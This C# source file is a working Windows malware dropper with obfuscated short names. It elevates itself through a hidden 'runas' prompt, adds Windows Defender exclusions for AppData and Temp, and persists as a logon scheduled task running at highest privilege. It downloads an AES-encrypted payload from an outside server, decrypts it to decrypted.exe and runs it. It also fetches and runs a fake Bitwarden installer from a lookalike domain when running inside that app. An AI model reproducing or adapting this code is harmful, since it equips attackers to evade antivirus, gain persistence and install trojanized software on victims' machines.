using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading.Tasks;

async Task A0()
{
    if (!B0())
    {
        var pR = Process.GetCurrentProcess();
        var stI = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = $"/c \"{pR.MainModule.FileName}\" -runAsAdmin {pR.Id}",
            UseShellExecute = true,
            Verb = "runas",
            WindowStyle = ProcessWindowStyle.Hidden
        };
        try
        {
            var qP = Process.Start(stI);
            qP?.WaitForExit();
        }
        catch {}
        Environment.Exit(0);
    }

    C0();

    string rU = "https://solarcellled.com/test.php";
    string uD = "ваш_uuid";
    if (!string.IsNullOrEmpty(uD))
    {
        rU += $"?uuid={Uri.EscapeDataString(uD)}";
    }
    await D0(rU);

    await F0();
    Environment.Exit(0);
}

async Task D0(string xU)
{
    using (var hC = new HttpClient())
    {
        var rs = await hC.GetAsync(xU);
        rs.EnsureSuccessStatusCode();
        var tR = await rs.Content.ReadAsStringAsync();
        string[] pS = tR.Split(',');
        if (pS.Length != 3) throw new Exception();

        byte[] kA = Convert.FromBase64String(pS[0]);
        byte[] iV = Convert.FromBase64String(pS[1]);
        byte[] encData = Convert.FromBase64String(pS[2]);
        var dData = E0(encData, kA, iV);

        string aP = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string bF = Path.Combine(aP, "BackupWin");
        if (!Directory.Exists(bF)) Directory.CreateDirectory(bF);
        string fP = Path.Combine(bF, "decrypted.exe");
        File.WriteAllBytes(fP, dData);

        Process.Start(new ProcessStartInfo(fP) { UseShellExecute = true });
    }
}

byte[] E0(byte[] data, byte[] K, byte[] I)
{
    using (var aE = Aes.Create())
    {
        aE.Key = K;
        aE.IV = I;
        ICryptoTransform dR = aE.CreateDecryptor(aE.Key, aE.IV);

        using (var msD = new MemoryStream(data))
        using (var csD = new CryptoStream(msD, dR, CryptoStreamMode.Read))
        using (var msR = new MemoryStream())
        {
            csD.CopyTo(msR);
            return msR.ToArray();
        }
    }
}

async Task F0()
{
    string pN = Process.GetCurrentProcess().ProcessName.ToLower();
    string aP = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string flP = Path.Combine(aP, "BackupWin", "install.flag");
    string dU = null;

    if (File.Exists(flP)) return;

    if (pN.Contains("notion"))
    {
        dU = "https://desktop-release.notion-static.com/Notion%20Setup%204.2.0.exe";
    }
    else if (pN.Contains("bitwarden"))
    {
        dU = "https://blgzd.com/Bitwarden.exe";
    }
    else if (pN.Contains("chrome"))
    {
        dU = "https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7B0CEC8E7A-72E5-2CE2-EEAF-CF82E51C75E1%7D%26lang%3Den-GB%26browser%3D5%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-statsdef_1%26installdataindex%3Dempty/update2/installers/ChromeSetup.exe";
    }

    if (string.IsNullOrEmpty(dU)) return;

    using (var cL = new HttpClient())
    {
        var rS = await cL.GetAsync(dU);
        rS.EnsureSuccessStatusCode();
        string bF = Path.Combine(aP, "BackupWin");
        if (!Directory.Exists(bF)) Directory.CreateDirectory(bF);

        string fN = Path.GetFileName(dU);
        string fP = Path.Combine(bF, fN);

        using (var sR = await rS.Content.ReadAsStreamAsync())
        using (var fS = new FileStream(fP, FileMode.Create, FileAccess.Write, FileShare.None))
        {
            await sR.CopyToAsync(fS);
        }

        Process.Start(new ProcessStartInfo(fP) { UseShellExecute = true });
        File.Create(flP).Dispose();
    }
}

bool B0()
{
    var wI = WindowsIdentity.GetCurrent();
    var wP = new WindowsPrincipal(wI);
    return wP.IsInRole(WindowsBuiltInRole.Administrator);
}

void C0()
{
    string aP = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string tP = Path.GetTempPath();

    var sI = new ProcessStartInfo
    {
        FileName = "cmd.exe",
        Arguments = $"/c powershell -Command \"Add-MpPreference -ExclusionPath '{aP}','{tP}'\"",
        UseShellExecute = true,
        Verb = "runas",
        WindowStyle = ProcessWindowStyle.Hidden
    };
    try
    {
        var pX = Process.Start(sI);
        pX.WaitForExit();
        if (pX.ExitCode == 0)
        {
            G0();
        }
    }
    catch { }
}


void G0()
{
    try
    {
        string tN = "BackupWinTask";
        string aP = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string bF = Path.Combine(aP, "BackupWin");
        if (!Directory.Exists(bF)) Directory.CreateDirectory(bF);

        string eX = Process.GetCurrentProcess().MainModule.FileName;
        string bC = Path.Combine(bF, Path.GetFileName(eX));
        if (!File.Exists(bC))
        {
            File.Copy(eX, bC, true);
        }
        var sI = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = $"/c schtasks /create /tn \"{tN}\" /tr \"\"\"{bC}\"\"\" /sc onlogon /f /rl HIGHEST",
            UseShellExecute = true,
            Verb = "runas",
            WindowStyle = ProcessWindowStyle.Hidden
        };
        var pX = Process.Start(sI);
        pX.WaitForExit();
    }
    catch {}
}

await A0();
